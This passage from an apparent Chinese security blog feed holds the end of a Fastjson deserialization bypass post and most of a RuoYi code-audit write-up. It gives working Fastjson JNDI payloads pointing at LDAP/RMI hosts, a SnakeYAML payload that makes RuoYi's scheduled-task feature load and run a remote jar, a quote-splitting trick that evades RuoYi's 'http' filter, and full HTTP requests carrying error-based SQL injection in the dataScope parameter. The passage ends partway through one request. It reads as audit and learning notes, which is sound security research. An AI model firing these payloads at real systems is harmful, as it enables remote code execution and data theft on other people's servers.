class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://vps:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://vps:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="fastjson1-2-5-1"><a href="#fastjson1-2-5-1" class="headerlink" title="fastjson1.2.5 &lt;&#x3D; 1.2.60"></a>fastjson1.2.5 &lt;&#x3D; 1.2.60</h2><p><strong>需要开启 autoType：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;xaDataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;prefix&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="fastjson1-2-5-2"><a href="#fastjson1-2-5-2" class="headerlink" title="fastjson1.2.5 &lt;&#x3D; 1.2.61"></a>fastjson1.2.5 &lt;&#x3D; 1.2.61</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jndiName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploi&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>如果版本是&lt;&#x3D;1.2.47，那么可以使用一下payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>原因是fastjson中对于val关键字会进行解析，然后获取到这个字符串，之后会对这个字符串进行解析，最终获取到这个class，调用了TypeUtils.loadClass，由于在<code>1.2.47</code>版本之前，<code>TypeUtils.loadClass</code>方法是默认设置缓存的，因此在第一次调用后就会将这个class设置mappings中，第二次循环就会从mappings中获取到这个class，直接进行序列化了，从而绕过<code>checkAutoType</code>的校验。使用这个payload不需要开启<code>autoTypeSupport</code>。</p><p>在<code>1.2.25</code>到<code>1.2.43</code>版本中可以尝试在<code>JdbcSetRowImpl</code>前面添加<code>L</code>末尾添加<code>;</code>，或者尝试<code>[</code>末尾添加<code>[&#123;</code>。</p><p>在小于等于<code>1.2.45</code>版本可以尝试使用<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>进行jndi注入。</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#autoTypeSupport">Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog (drun1baby.top)</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ruoyi代码审计</title>
    <link href="/2024/04/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Ruoyi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/04/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Ruoyi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建环境："><a href="#搭建环境：" class="headerlink" title="搭建环境："></a>搭建环境：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://gitee.com/y_project/RuoYi.git<br></code></pre></td></tr></table></figure><p>本次的ruoyi版本为4.0。</p><p>使用<code>git checkout [版本号]</code>进行版本切换。</p><p>使用<code>git tag</code>可以查看很多版本列表</p><h1 id="审计过程："><a href="#审计过程：" class="headerlink" title="审计过程："></a>审计过程：</h1><h2 id="1-shiro组件："><a href="#1-shiro组件：" class="headerlink" title="1. shiro组件："></a>1. shiro组件：</h2><h3 id="1-1-爆破shiro密码："><a href="#1-1-爆破shiro密码：" class="headerlink" title="1.1 爆破shiro密码："></a>1.1 爆破shiro密码：</h3><p><img src="/../../blog_image/image-20240306084805550.png" alt="image-20240306084805550"></p><p>点击检测当前密钥后再点击爆破密码就会自动执行shiro密码爆破。</p><h3 id="1-2-执行命令："><a href="#1-2-执行命令：" class="headerlink" title="1.2 执行命令："></a>1.2 执行命令：</h3><p>执行shiro反序列化，任意执行命令。</p><p>点击了检测当前利用链，就可以判断是否存在反序列化。</p><p><img src="/../../blog_image/image-20240306085140804.png" alt="image-20240306085140804"></p><p>执行任意命令：</p><p><img src="/../../blog_image/image-20240306085311381.png" alt="image-20240306085311381"></p><h2 id="2-定时任务："><a href="#2-定时任务：" class="headerlink" title="2. 定时任务："></a>2. 定时任务：</h2><h3 id="如何使用定时任务？"><a href="#如何使用定时任务？" class="headerlink" title="如何使用定时任务？"></a>如何使用定时任务？</h3><p>首先需要注入到bean中：</p><p><img src="/../../blog_image/image-20240306095244421.png" alt="image-20240306095244421"></p><p>接着编写cron表达式，需要指定哪个bean中的哪个方法。</p><p><img src="/../../blog_image/image-20240306095312930.png" alt="image-20240306095312930"></p><p><img src="/../../blog_image/image-20240306095224450.png" alt="image-20240306095224450"></p><p>定时任务存在调用任意类的任意方法，如图所示：</p><p><img src="/../../blog_image/image-20240307095915440.png" alt="image-20240307095915440"></p><p>从请求中获取到了job的相关信息，其中包括job的调用字符串，因此可以调用任意类。</p><h3 id="版本"><a href="#版本" class="headerlink" title="版本&lt;&#x3D;4.6.2 RCE："></a>版本&lt;&#x3D;4.6.2 RCE：</h3><p>影响版本：<code>RuoYi&lt;4.6.2</code></p><p>简要描述：由于若依后台计划任务处，对于传入的”调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。</p><p>当前复现版本为<code>若依4.0</code></p><p>下载poc：</p><p><a href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads (github.com)</a></p><p>编写poc的yaml文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!javax.script.ScriptEngineManager</span> [<br>  <span class="hljs-type">!!java.net.URLClassLoader</span> [[<br>    <span class="hljs-type">!!java.net.URL</span> [<span class="hljs-string">&quot;http://127.0.0.1:88/yaml-payload.jar&quot;</span>]<br>  ]]<br>]<br></code></pre></td></tr></table></figure><p>修改执行命令：</p><p><img src="/../../blog_image/image-20240307100835373.png" alt="image-20240307100835373"></p><p>编译执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac .\src\artsploit\AwesomeScriptEngineFactory.java<br>jar -cvf yaml-payload.jar -C src/ .<br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307101637234.png" alt="image-20240307101637234"></p><p>启动一个python的文件服务：</p><p><img src="/../../blog_image/image-20240307101658018.png" alt="image-20240307101658018"></p><p>新增一个定时任务：</p><p><img src="/../../blog_image/image-20240307101851020.png" alt="image-20240307101851020"></p><p>poc如下：</p><blockquote><p>org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“<a href="http://127.0.0.1:88/yaml-payload.jar%22]]]]">http://127.0.0.1:88/yaml-payload.jar&quot;]]]]</a>‘)</p></blockquote><p>执行成功：</p><p><img src="/../../blog_image/image-20240307103326216.png" alt="image-20240307103326216"></p><p>这里复刻很奇怪，如果若依使用了高版本的jdk(jdk19)即可复现成功，但是使用1.8就不行，不知道为什么。</p><blockquote><p>Caused by: java.lang.UnsupportedClassVersionError: artsploit&#x2F;AwesomeScriptEngineFactory has been compiled by a more recent version of the Java Runtime (class file version 63.0), this version of the Java Runtime only recognizes class file versions up to 52.0</p></blockquote><h3 id="版本4-6-2："><a href="#版本4-6-2：" class="headerlink" title="版本4.6.2："></a>版本4.6.2：</h3><p>当前审计版本<code>4.6.2</code>:</p><p>只判断了rmi服务。</p><p><img src="/../../blog_image/image-20240307105411783.png" alt="image-20240307105411783"></p><p>一样可以弹：</p><p>poc和上面一样：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">org.yaml.snakeyaml.Yaml.<span class="hljs-keyword">load</span>(&#x27;!<span class="hljs-title">!javax.script.ScriptEngineManager</span> [!<span class="hljs-title">!java.net.URLClassLoader</span> [[!<span class="hljs-title">!java.net.URL</span> [<span class="hljs-string">&quot;http://127.0.0.1:88/yaml-payload.jar&quot;</span>]]]]&#x27;)<br></code></pre></td></tr></table></figure><h3 id="版本4-7-0："><a href="#版本4-7-0：" class="headerlink" title="版本4.7.0："></a>版本4.7.0：</h3><p>添加任务中存在校验，而且是后端校验：</p><p><img src="/../../blog_image/image-20240307110008645.png" alt="image-20240307110008645"></p><p>但是没有黑名单校验：</p><p><img src="/../../blog_image/image-20240307110118297.png" alt="image-20240307110118297"></p><p>因此还是可以bpass，同样的poc，只需要使用单引号即可绕过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.yaml</span><span class="hljs-selector-class">.snakeyaml</span><span class="hljs-selector-class">.Yaml</span><span class="hljs-selector-class">.load</span>(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;&#x27;</span>h<span class="hljs-string">&#x27;&#x27;</span>t<span class="hljs-string">&#x27;&#x27;</span>t<span class="hljs-string">&#x27;&#x27;</span>p<span class="hljs-string">&#x27;://127.0.0.1:88/yaml-payload.jar&quot;]]]]&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307110247325.png" alt="image-20240307110247325"></p><h3 id="版本-4-7-2"><a href="#版本-4-7-2" class="headerlink" title="版本&gt;4.7.2:"></a>版本&gt;4.7.2:</h3><p>在添加中存在校验</p><p><img src="/../../blog_image/image-20240307104929203.png" alt="image-20240307104929203"></p><p>存在黑名单校验：</p><p><img src="/../../blog_image/image-20240307105040908.png" alt="image-20240307105040908"></p><p>还存在rmi校验，不知道如何bypass。</p><p>发现可以结合sql注入，然后修改字段最终实现bypass。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><blockquote><p>如果想使用ruoyi定时任务实现rce，可以先直接调用<a href="github.com"><a href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads (github.com)</a></a>的poc，如果是小于4.6.2版本则直接可以实现rce。在小于4.7.2版本中会校验是否存在rmi，ldap服务，以及对字符串判断是否存在http字样。如果存在http字样，可以使用单引号绕过，如<code>&#39;h&#39;&#39;t&#39;&#39;t&#39;&#39;t&#39;</code>。</p><p>在大于4.7.2版本则会添加类黑名单。</p></blockquote><h2 id="3-sql注入："><a href="#3-sql注入：" class="headerlink" title="3. sql注入："></a>3. sql注入：</h2><p>查询sql注入的方法可以从mybatis的配置文件入手，全局搜索<code>$&#123;</code>即可。</p><p><img src="/../../blog_image/image-20240307140934631.png" alt="image-20240307140934631"></p><h3 id="3-1-查询角色管理列表sql注入："><a href="#3-1-查询角色管理列表sql注入：" class="headerlink" title="3.1 查询角色管理列表sql注入："></a>3.1 查询角色管理列表sql注入：</h3><p>路径为<code>/system/role/list</code></p><p>查询mybatis的xml文件，可以查询到没有预编译的sql：</p><p><img src="/../../blog_image/image-20240307141034016.png" alt="image-20240307141034016"></p><p>查询到controller层，如图所示：</p><p><img src="/../../blog_image/image-20240307141118479.png" alt="image-20240307141118479"></p><p>由于这个role对象是从前端传进来的，而且是可控的，service层也是直接调用了，没有进行参数的校验，因此这个role对象是可控的。直接传递到dao层。</p><p>因此注入点是<code>params[dataScope]</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>185<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=90aee3bf-d1af-480c-90ce-cd2ff50b733b<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">pageSize=<span class="hljs-variable">&amp;pageNum</span>=<span class="hljs-variable">&amp;orderByColumn</span>=<span class="hljs-variable">&amp;isAsc</span>=<span class="hljs-variable">&amp;roleName</span>=<span class="hljs-variable">&amp;roleKey</span>=<span class="hljs-variable">&amp;status</span>=<span class="hljs-variable">&amp;params</span>[beginTime]=<span class="hljs-variable">&amp;params</span>[endTime]=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span> database())),0x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307140735953.png" alt="image-20240307140735953"></p><p>或者是使用<code>extractvalue</code>进行注入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">params<span class="hljs-selector-attr">[dataScope]</span>=and <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-built_in">database</span>()),<span class="hljs-number">0</span>x7e))<br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307140651560.png" alt="image-20240307140651560"></p><h3 id="3-2-查询用户列表："><a href="#3-2-查询用户列表：" class="headerlink" title="3.2 查询用户列表："></a>3.2 查询用户列表：</h3><p>路径为<code>/system/user/list</code></p><p><img src="/../../blog_image/image-20240307142001933.png" alt="image-20240307142001933"></p><p>也是存在dataScope注入点。</p><p>service层：</p><p><img src="/../../blog_image/image-20240307142049062.png" alt="image-20240307142049062"></p><p>dao层：</p><p><img src="/../../blog_image/image-20240307142105532.png" alt="image-20240307142105532"></p><p>也是一样的，user对象从前端传入后就没有经过校验，由于user的dataScope属性是可控的，因此这个sql注入点是存在的。</p><p>访问路径：<code>/system/user/list</code></p><p><img src="/../../blog_image/image-20240307142321189.png" alt="image-20240307142321189"></p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/user/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>218<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/user<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">pageSize=10<span class="hljs-variable">&amp;pageNum</span>=1<span class="hljs-variable">&amp;orderByColumn</span>=createTime<span class="hljs-variable">&amp;isAsc</span>=desc<span class="hljs-variable">&amp;deptId</span>=<span class="hljs-variable">&amp;parentId</span>=<span class="hljs-variable">&amp;loginName</span>=<span class="hljs-variable">&amp;phonenumber</span>=<span class="hljs-variable">&amp;status</span>=<span class="hljs-variable">&amp;params</span>[beginTime]=<span class="hljs-variable">&amp;params</span>[endTime]=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-keyword">and</span> extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> versio<span class="hljs-meta">n</span>()),0x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307142817981.png" alt="image-20240307142817981"></p><p>或者修改为<code>&amp;params[dataScope]=and(select updatexml(1,concat(0x7e,(SELECT database())),0x7e))</code></p><p><img src="/../../blog_image/image-20240307142918619.png" alt="image-20240307142918619"></p><h3 id="3-3-角色导出："><a href="#3-3-角色导出：" class="headerlink" title="3.3 角色导出："></a>3.3 角色导出：</h3><p>请求路径为：<code>/system/role/expor</code></p><p>审计了一下就是调用了查询角色列表，因此查询角色列表的sql注入可以复用：</p><p><img src="/../../blog_image/image-20240307143454429.png" alt="image-20240307143454429"></p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/export</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>75<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-stylus">params<span class="hljs-selector-attr">[dataScope]</span>=and <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-built_in">database</span>()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307143133597.png" alt="image-20240307143133597"></p><h3 id="3-4-导出用户列表："><a href="#3-4-导出用户列表：" class="headerlink" title="3.4 导出用户列表："></a>3.4 导出用户列表：</h3><p>请求路径为<code>/system/user/export</code></p><p>和上面的查询用户列表一样，可以复用：</p><p><img src="/../../blog_image/image-20240307143252886.png" alt="image-20240307143252886"></p><p>poc如下，可也使用<code>and(select updatexml(1,concat(0x7e,(SELECT database())),0x7e))</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/user/export</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>75<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: 